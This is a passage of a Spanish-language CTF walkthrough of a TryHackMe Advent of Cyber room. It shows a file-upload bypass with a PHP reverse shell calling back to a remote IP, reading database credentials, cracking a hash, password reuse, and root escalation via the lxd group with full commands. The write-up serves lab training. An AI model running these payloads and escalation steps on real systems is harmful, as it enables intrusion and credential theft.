      <span class="nx">changeMsg</span><span class="p">(</span><span class="s2">&#34;Invalid File Type&#34;</span><span class="p">);</span>
      <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>
  <span class="p">}</span>
<span class="p">[...</span> <span class="nx">snip</span> <span class="p">...</span> <span class="p">]</span>
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2418.09.00.png" alt="image" /></p>
<p>Subimos una imagen: <code>batman.jpg</code>.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2418.10.29.png" alt="image" /></p>
<p>Creamos un archivo que ejecute nuestra shell inversa con el nombre y codigo <code>shell.jpg.php</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">&lt;?php
system<span class="o">(</span><span class="s2">&#34;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&#34;10.2.29.162\&#34;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&#34;/bin/sh\&#34;,\&#34;-i\&#34;]);&#39;&#34;</span><span class="o">)</span><span class="p">;</span>

?&gt;
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2418.32.07.png" alt="image" /></p>
<ul>
<li><strong>What is the value of the web.txt flag?</strong>, con nuestra shell realizamos la busqueda del archivo<code>web.txt</code>.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/public_html/grid$ find / -name web.txt 2&gt;/dev/null
&lt;/public_html/grid$ find / -name web.txt 2&gt;/dev/null    
/var/www/web.txt
www-data@light-cycle:/var/www/TheGrid/public_html/grid$ cat /var/www/web.txt
cat /var/www/web.txt
THM<span class="o">{</span>ENT<span class="o">[</span>... snip ...<span class="o">]</span>ID<span class="o">}</span>
www-data@light-cycle:/var/www/TheGrid/public_html/grid$
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><strong>Upgrade and stabilize your shell.</strong>, con nuestra shell y con la descripcion del reto actualizamos nuestra shell a una más comoda.</p>
</li>
<li>
<p><strong>Review the configuration files for the webserver to find some useful loot in the form of credentials. What credentials do you find? username:password</strong>, realizamos una enumeracion de archivos de la pagina que encontramos y vemos las credenciales para la base de datos.</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/includes$ cat dbauth.php
cat dbauth.php
&lt;?php
  <span class="nv">$dbaddr</span> <span class="o">=</span> <span class="s2">&#34;localhost&#34;</span><span class="p">;</span>
  <span class="nv">$dbuser</span> <span class="o">=</span> <span class="s2">&#34;t[... snip ...]on&#34;</span><span class="p">;</span>
  <span class="nv">$dbpass</span> <span class="o">=</span> <span class="s2">&#34;IFight[... snip ...]Users&#34;</span><span class="p">;</span>
  <span class="nv">$database</span> <span class="o">=</span> <span class="s2">&#34;tron&#34;</span><span class="p">;</span>

  <span class="nv">$dbh</span> <span class="o">=</span> new mysqli<span class="o">(</span><span class="nv">$dbaddr</span>, <span class="nv">$dbuser</span>, <span class="nv">$dbpass</span>, <span class="nv">$database</span><span class="o">)</span><span class="p">;</span>
  <span class="k">if</span><span class="o">(</span><span class="nv">$dbh</span>-&gt;connect_error<span class="o">){</span>
    die<span class="o">(</span><span class="nv">$dbh</span>-&gt;connect_error<span class="o">)</span><span class="p">;</span>
  <span class="o">}</span>
?&gt;
</code></pre></td></tr></table>
</div>
</div><ul>
<li><strong>Access the database and discover the encrypted credentials. What is the name of the database you find these in?</strong>, utilizando las credenciales ingresamos a la base de datos donde vemos las credenciales encriptadas.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/includes$ mysql -u tron -p
<span class="o">[</span>... snip ...<span class="o">]</span>

mysql&gt; show databases<span class="p">;</span>
show databases<span class="p">;</span>
+--------------------+
<span class="p">|</span> Database           <span class="p">|</span>
+--------------------+
<span class="p">|</span> information_schema <span class="p">|</span>
<span class="p">|</span> tron               <span class="p">|</span>
+--------------------+
<span class="m">2</span> rows in <span class="nb">set</span> <span class="o">(</span>0.09 sec<span class="o">)</span>

mysql&gt; use tron<span class="p">;</span>
show tables<span class="p">;</span>
use tron<span class="p">;</span>

Database changed
mysql&gt; show tables<span class="p">;</span>
+----------------+
<span class="p">|</span> Tables_in_tron <span class="p">|</span>
+----------------+
<span class="p">|</span> users          <span class="p">|</span>
+----------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt; <span class="k">select</span> * from users<span class="p">;</span>
<span class="k">select</span> * from users<span class="p">;</span>
+----+----------+----------------------------------+
<span class="p">|</span> id <span class="p">|</span> username <span class="p">|</span> password                         <span class="p">|</span>
+----+----------+----------------------------------+
<span class="p">|</span>  <span class="m">1</span> <span class="p">|</span> flynn    <span class="p">|</span> edc628f6<span class="o">[</span>... snip ...<span class="o">]</span>683f5e3ff7 <span class="p">|</span>
+----+----------+----------------------------------+
<span class="m">1</span> row in <span class="nb">set</span> <span class="o">(</span>0.00 sec<span class="o">)</span>

mysql&gt;
</code></pre></td></tr></table>
</div>
</div><ul>
<li>
<p><strong>Crack the password. What is it?</strong>, utilizando <a href="https://crackstation.net/">CrackStation</a> obtenemos en texto plano el hash que encontramos en la base de datos.<br />
<img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2419.01.38.png" alt="image" /></p>
</li>
<li>
<p><strong>Use su to login to the newly discovered user by exploiting password reuse. - What is the value of the user.txt flag?</strong>, utilizamos la contraseña y usuario en la maquina para cambiar de usuario y obtener la flag <code>user.txt</code>.</p>
</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">www-data@light-cycle:/var/www/TheGrid/includes$ cat /etc/passwd
cat /etc/passwd
root❌0:0:root:/root:/bin/bash
<span class="o">[</span>... snip ...<span class="o">]</span>
pollinate❌111:1::/var/cache/pollinate:/bin/false
flynn❌1000:1000:flynn,,,:/home/flynn:/bin/bash
www-data@light-cycle:/var/www/TheGrid/includes$ su flynn
su flynn
Password: @co<span class="o">[</span>... snip ...<span class="o">]</span>er@

flynn@light-cycle:/var/www/TheGrid/includes$ <span class="nb">cd</span>
<span class="nb">cd</span>
flynn@light-cycle:~$ ls -lah
ls -lah
total 32K
drwxr-xr-x <span class="m">4</span> flynn flynn 4.0K Dec <span class="m">19</span> 16:42 .
drwxr-xr-x <span class="m">3</span> root  root  4.0K Dec <span class="m">18</span> 14:08 ..
lrwxrwxrwx <span class="m">1</span> root  root     <span class="m">9</span> Dec <span class="m">18</span> 17:44 .bash_history -&gt; /dev/null
-rw-r--r-- <span class="m">1</span> flynn flynn  <span class="m">220</span> Dec <span class="m">18</span> 14:08 .bash_logout
-rw-r--r-- <span class="m">1</span> flynn flynn 3.7K Dec <span class="m">18</span> 14:08 .bashrc
drwx------ <span class="m">2</span> flynn flynn 4.0K Dec <span class="m">18</span> 14:10 .cache
drwx------ <span class="m">3</span> flynn flynn 4.0K Dec <span class="m">18</span> 14:10 .gnupg
-rw-r--r-- <span class="m">1</span> flynn flynn  <span class="m">807</span> Dec <span class="m">18</span> 14:08 .profile
-rw-r--r-- <span class="m">1</span> flynn flynn    <span class="m">0</span> Dec <span class="m">18</span> 14:10 .sudo_as_admin_successful
-r-------- <span class="m">1</span> flynn flynn   <span class="m">30</span> Dec <span class="m">19</span> 16:42 user.txt
flynn@light-cycle:~$ cat user.txt
cat user.txt
THM<span class="o">{</span>IDEN<span class="o">[</span>... snip ...<span class="o">]</span>NISED<span class="o">}</span>
flynn@light-cycle:~$
</code></pre></td></tr></table>
</div>
</div><ul>
<li><strong>Check the user&rsquo;s groups. Which group can be leveraged to escalate privileges?</strong>, vemos los grupos a los que el usuario actual pertence.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">flynn@light-cycle:~$ id
id
<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>flynn<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>flynn<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>flynn<span class="o">)</span>,109<span class="o">(</span>lxd<span class="o">)</span>
flynn@light-cycle:~$ groups
groups
flynn lxd
flynn@light-cycle:~$
</code></pre></td></tr></table>
</div>
</div><ul>
<li><strong>Abuse this group to escalate privileges to root.</strong>, utilizamos la misma forma para escalar privilegios con lxd como en las <a href="https://sckull.github.io/tags/lxd/"><code>maquinas de htb y thm</code></a>.</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#LOCAL</span>
git clone  https://github.com/saghul/lxd-alpine-builder.git
<span class="nb">cd</span> lxd-alpine-builder
./build-alpine -a i686

<span class="c1">#GAMINSERVER MACHINE</span>
lxc image import ./alpine-v3.12-i686-20200831_2152.tar.gz --alias myimage
lxc image list

lxc init myimage sckull -c security.privileged<span class="o">=</span><span class="nb">true</span>
lxc config device add sckull mydevice disk <span class="nv">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>
lxc start sckull
lxc <span class="nb">exec</span> sckull /bin/sh
</code></pre></td></tr></table>
</div>
</div><p><img src="/images/posts/thm/aoc2/Screenshotfrom2020-12-2419.20.22.png" alt="image" /></p>
<ul>
<li><strong>What is the value of the root.txt flag?</strong></li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">~ <span class="c1"># cd /mnt/root/root</span>
<span class="nb">cd</span> /mnt/root/root
/mnt/root/root <span class="c1"># ls -lah</span>
ls -lah
total 32K    
drwx------    <span class="m">4</span> root     root        4.0K Dec <span class="m">20</span> 03:51 .
drwxr-xr-x   <span class="m">23</span> root     root        4.0K Dec <span class="m">18</span> 14:18 ..
lrwxrwxrwx    <span class="m">1</span> root     root           <span class="m">9</span> Dec <span class="m">18</span> 17:43 .bash_history -&gt; /dev/null
-rw-r--r--    <span class="m">1</span> root     root        3.0K Apr  <span class="m">9</span>  <span class="m">2018</span> .bashrc
drwxr-x---    <span class="m">3</span> root     root        4.0K Dec <span class="m">20</span> 03:51 .config
lrwxrwxrwx    <span class="m">1</span> root     root           <span class="m">9</span> Dec <span class="m">19</span> 15:15 .mysql-history -&gt; /dev/null
-rw-------    <span class="m">1</span> root     root         <span class="m">264</span> Dec <span class="m">19</span> 15:19 .mysql_history
-rw-r--r--    <span class="m">1</span> root     root         <span class="m">148</span> Aug <span class="m">17</span>  <span class="m">2015</span> .profile
drwx------    <span class="m">2</span> root     root        4.0K Dec <span class="m">18</span> 17:57 .ssh
-r--------    <span class="m">1</span> root     root         <span class="m">600</span> Dec <span class="m">19</span> 20:18 root.txt
/mnt/root/root <span class="c1"># cat root.txt</span>
cat root.txt
THM<span class="o">{</span>FLY<span class="o">[</span>... snip ...<span class="o">]</span>ES<span class="o">}</span>



<span class="s2">&#34;As Elf McEager claimed the root flag a click could be heard as a small chamber on the anterior of the NUC popped open. Inside, McEager saw a small object, roughly the size of an SD card. As a moment, he realized that was exactly what it was. Perplexed, McEager shuffled around his desk to pick up the card and slot it into his computer. Immediately this prompted a window to open with the word &#39;HOLO&#39; embossed in the center of what appeared to be a network of computers. Beneath this McEager read the following: Thank you for playing! Merry Christmas and happy holidays to all!&#34;</span>
/mnt/root/root #
</code></pre></td></tr></table>
</div>
</div>
    </article>
    
    <script>
  'use strict';
  
  function wrap(el, wrapper) {
    el.parentNode.insertBefore(wrapper, el);
    wrapper.appendChild(el);
  }

  (function () {
    var singleContentsElem = document.querySelector('.single__contents');
    singleContentsElem ? 
    singleContentsElem.querySelectorAll('pre > code').forEach(function(elem) {
      var dataLang = elem.getAttribute('data-lang');
      var dataLangWrapper = document.createElement('div');
      var code = null;
      var codeTitle = null;

      if (dataLang && dataLang.includes(':')) {
        code = dataLang.split(':')[0];
        codeTitle = dataLang.split(':')[1];

        dataLangWrapper.className = 'language-' + code;
        dataLangWrapper.setAttribute('data-lang', codeTitle);

        elem.className = 'language-' + code;
        elem.setAttribute('data-lang', codeTitle);
        elem.setAttribute('id', codeTitle);
      } else if (!dataLang) {
        dataLangWrapper.setAttribute('data-lang', 'Code');
        dataLangWrapper.className = 'language-code';
      }

      if (!dataLang || codeTitle) {
        wrap(elem.parentNode, dataLangWrapper);
      }

    }) : null;
  })();

  var langCodeElem = document.querySelectorAll('.language-code');
  langCodeElem ? langCodeElem.forEach(function (elem) {
    var newElem = document.createElement('span');
    newElem.className = 'copy-to-clipboard';
    newElem.setAttribute('title', 'Copy to clipboard');
    elem.append(newElem);
  }) : null;
  
</script>
    
<div class="donation">
  <div class="donation__message">
    Share on
  </div>
  <div class="donation__icons">
    
    
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?u=https%3a%2f%2fsckull.github.io%2fposts%2faoc2020%2f" title="Facebook" aria-label="Facebook Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="facebook" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m15.997 3.985h2.191v-3.816c-.378-.052-1.678-.169-3.192-.169-3.159 0-5.323 1.987-5.323 5.639v3.361h-3.486v4.266h3.486v10.734h4.274v-10.733h3.345l.531-4.266h-3.877v-2.939c.001-1.233.333-2.077 2.051-2.077z"/></svg>
        </a>
      
    
      
        <a href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fsckull.github.io%2fposts%2faoc2020%2f&title=TryHackMe%20-%20Advent%20of%20Cyber%202 &summary=&source=Walkthrough%20%3a%3a%20Writeups%20de%20rooms%20y%20maquinas%20de%20TryHackMe%2c%20HackTheBox%20y%20CTFs%2c%20en%20espa%c3%b1ol" target="_blank" rel="noreferer" title="LinkedIn" aria-label="LinkedIn Share Button" class="donation__item" data-type="share">
          <svg data-name="linkedin" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m23.994 24v-.001h.006v-8.802c0-4.306-.927-7.623-5.961-7.623-2.42 0-4.044 1.328-4.707 2.587h-.07v-2.185h-4.773v16.023h4.97v-7.934c0-2.089.396-4.109 2.983-4.109 2.549 0 2.587 2.384 2.587 4.243v7.801z"/><path d="m.396 7.977h4.976v16.023h-4.976z"/><path d="m2.882 0c-1.591 0-2.882 1.291-2.882 2.882s1.291 2.909 2.882 2.909 2.882-1.318 2.882-2.909c-.001-1.591-1.292-2.882-2.882-2.882z"/></svg>
        </a>
      
    
      
        <a href="https://twitter.com/intent/tweet?text=TryHackMe%20-%20Advent%20of%20Cyber%202&url=https%3a%2f%2fsckull.github.io%2fposts%2faoc2020%2f&hashtags=web%2creversing%2cnetworking%2cscripting%2cpython%2cblue%2c&via=sckull" title="Twitter" aria-label="Twitter Share Button" class="donation__item" target="_blank" rel="noreferrer" data-type="share">
          <svg data-name="twitter" enable-background="new 0 0 24 24" viewBox="0 0 24 24" width="35" height="35" fill="currentColor" xmlns="http://www.w3.org/2000/svg"><path d="m21.534 7.113c.976-.693 1.797-1.558 2.466-2.554v-.001c-.893.391-1.843.651-2.835.777 1.02-.609 1.799-1.566 2.165-2.719-.951.567-2.001.967-3.12 1.191-.903-.962-2.19-1.557-3.594-1.557-2.724 0-4.917 2.211-4.917 4.921 0 .39.033.765.114 1.122-4.09-.2-7.71-2.16-10.142-5.147-.424.737-.674 1.58-.674 2.487 0 1.704.877 3.214 2.186 4.089-.791-.015-1.566-.245-2.223-.606v.054c0 2.391 1.705 4.377 3.942 4.835-.401.11-.837.162-1.29.162-.315 0-.633-.018-.931-.084.637 1.948 2.447 3.381 4.597 3.428-1.674 1.309-3.8 2.098-6.101 2.098-.403 0-.79-.018-1.177-.067 2.18 1.405 4.762 2.208 7.548 2.208 8.683 0 14.342-7.244 13.986-14.637z"/></svg>
        </a>
      
    
  </div>
</div>

    
    
<div class="whoami__gutter"></div>
<hr class="hr-slash whoami-hr"/>
<section class="whoami">
  <div class="whoami__image-wrapper">
    
    
      
        <img data-src="/images/whoami/avatar.jpg" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" alt="sckull" class="lazyload whoami__image"/>
      
    
  </div>
  <div class="whoami__contents">
    <div class="whoami__written-by">
      WRITTEN BY
    </div>
    <div class="whoami__title">
      
        sckull
      
    </div>
    <div class="whoami__desc">
      
        Pentester |&amp; Web Dev wannabe
      
    </div>
    <div class="whoami__social">
      
      
      
      
      
      
      
      
      <a href="https://github.com/sckull" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      
      <a href="https://steamcommunity.com/id/sckull" title="steam" aria-label="steam">
        <svg fill="#000000" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 50 50" width="25" height="25"><path fill="currentColor" d="M 25 3 C 13.59 3 4.209375 11.680781 3.109375 22.800781 L 14.300781 28.529297 C 15.430781 27.579297 16.9 27 18.5 27 L 18.550781 27 C 18.940781 26.4 19.389375 25.649141 19.859375 24.869141 C 20.839375 23.259141 21.939531 21.439062 23.019531 20.039062 C 23.259531 15.569063 26.97 12 31.5 12 C 36.19 12 40 15.81 40 20.5 C 40 25.03 36.430937 28.740469 31.960938 28.980469 C 30.560938 30.060469 28.750859 31.160859 27.130859 32.130859 C 26.350859 32.610859 25.6 33.059219 25 33.449219 L 25 33.5 C 25 37.09 22.09 40 18.5 40 C 14.91 40 12 37.09 12 33.5 C 12 33.33 12.009531 33.17 12.019531 33 L 3.2792969 28.519531 C 4.9692969 38.999531 14.05 47 25 47 C 37.15 47 47 37.15 47 25 C 47 12.85 37.15 3 25 3 z M 31.5 14 C 27.92 14 25 16.92 25 20.5 C 25 24.08 27.92 27 31.5 27 C 35.08 27 38 24.08 38 20.5 C 38 16.92 35.08 14 31.5 14 z M 31.5 16 C 33.99 16 36 18.01 36 20.5 C 36 22.99 33.99 25 31.5 25 C 29.01 25 27 22.99 27 20.5 C 27 18.01 29.01 16 31.5 16 z M 18.5 29 C 17.71 29 16.960313 29.200312 16.320312 29.570312 L 19.640625 31.269531 C 20.870625 31.899531 21.350469 33.410625 20.730469 34.640625 C 20.280469 35.500625 19.41 36 18.5 36 C 18.11 36 17.729375 35.910469 17.359375 35.730469 L 14.029297 34.019531 C 14.289297 36.259531 16.19 38 18.5 38 C 20.99 38 23 35.99 23 33.5 C 23 31.01 20.99 29 18.5 29 z"/></svg>
      </a>
      
      
      
      <a href="https://t.me/sckull" title="telegram" aria-label="telegram">
        <svg data-name="telegram" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="25" height="25"><path fill="currentColor" d="M 26.070313 3.996094 C 25.734375 4.011719 25.417969 4.109375 25.136719 4.21875 L 25.132813 4.21875 C 24.847656 4.332031 23.492188 4.902344 21.433594 5.765625 C 19.375 6.632813 16.703125 7.757813 14.050781 8.875 C 8.753906 11.105469 3.546875 13.300781 3.546875 13.300781 L 3.609375 13.277344 C 3.609375 13.277344 3.25 13.394531 2.875 13.652344 C 2.683594 13.777344 2.472656 13.949219 2.289063 14.21875 C 2.105469 14.488281 1.957031 14.902344 2.011719 15.328125 C 2.101563 16.050781 2.570313 16.484375 2.90625 16.722656 C 3.246094 16.964844 3.570313 17.078125 3.570313 17.078125 L 3.578125 17.078125 L 8.460938 18.722656 C 8.679688 19.425781 9.949219 23.597656 10.253906 24.558594 C 10.433594 25.132813 10.609375 25.492188 10.828125 25.765625 C 10.933594 25.90625 11.058594 26.023438 11.207031 26.117188 C 11.265625 26.152344 11.328125 26.179688 11.390625 26.203125 C 11.410156 26.214844 11.429688 26.21875 11.453125 26.222656 L 11.402344 26.210938 C 11.417969 26.214844 11.429688 26.226563 11.441406 26.230469 C 11.480469 26.242188 11.507813 26.246094 11.558594 26.253906 C 12.332031 26.488281 12.953125 26.007813 12.953125 26.007813 L 12.988281 25.980469 L 15.871094 23.355469 L 20.703125 27.0625 L 20.8125 27.109375 C 21.820313 27.550781 22.839844 27.304688 23.378906 26.871094 C 23.921875 26.433594 24.132813 25.875 24.132813 25.875 L 24.167969 25.785156 L 27.902344 6.65625 C 28.007813 6.183594 28.035156 5.742188 27.917969 5.3125 C 27.800781 4.882813 27.5 4.480469 27.136719 4.265625 C 26.769531 4.046875 26.40625 3.980469 26.070313 3.996094 Z M 25.96875 6.046875 C 25.964844 6.109375 25.976563 6.101563 25.949219 6.222656 L 25.949219 6.234375 L 22.25 25.164063 C 22.234375 25.191406 22.207031 25.25 22.132813 25.308594 C 22.054688 25.371094 21.992188 25.410156 21.667969 25.28125 L 15.757813 20.75 L 12.1875 24.003906 L 12.9375 19.214844 C 12.9375 19.214844 22.195313 10.585938 22.59375 10.214844 C 22.992188 9.84375 22.859375 9.765625 22.859375 9.765625 C 22.886719 9.3125 22.257813 9.632813 22.257813 9.632813 L 10.082031 17.175781 L 10.078125 17.15625 L 4.242188 15.191406 L 4.242188 15.1875 C 4.238281 15.1875 4.230469 15.183594 4.226563 15.183594 C 4.230469 15.183594 4.257813 15.171875 4.257813 15.171875 L 4.289063 15.15625 L 4.320313 15.144531 C 4.320313 15.144531 9.53125 12.949219 14.828125 10.71875 C 17.480469 9.601563 20.152344 8.476563 22.207031 7.609375 C 24.261719 6.746094 25.78125 6.113281 25.867188 6.078125 C 25.949219 6.046875 25.910156 6.046875 25.96875 6.046875 Z"/></svg>
      </a>
      
      
      
      
      
      <a href="https://twitter.com/sckull_" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="25" height="25" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 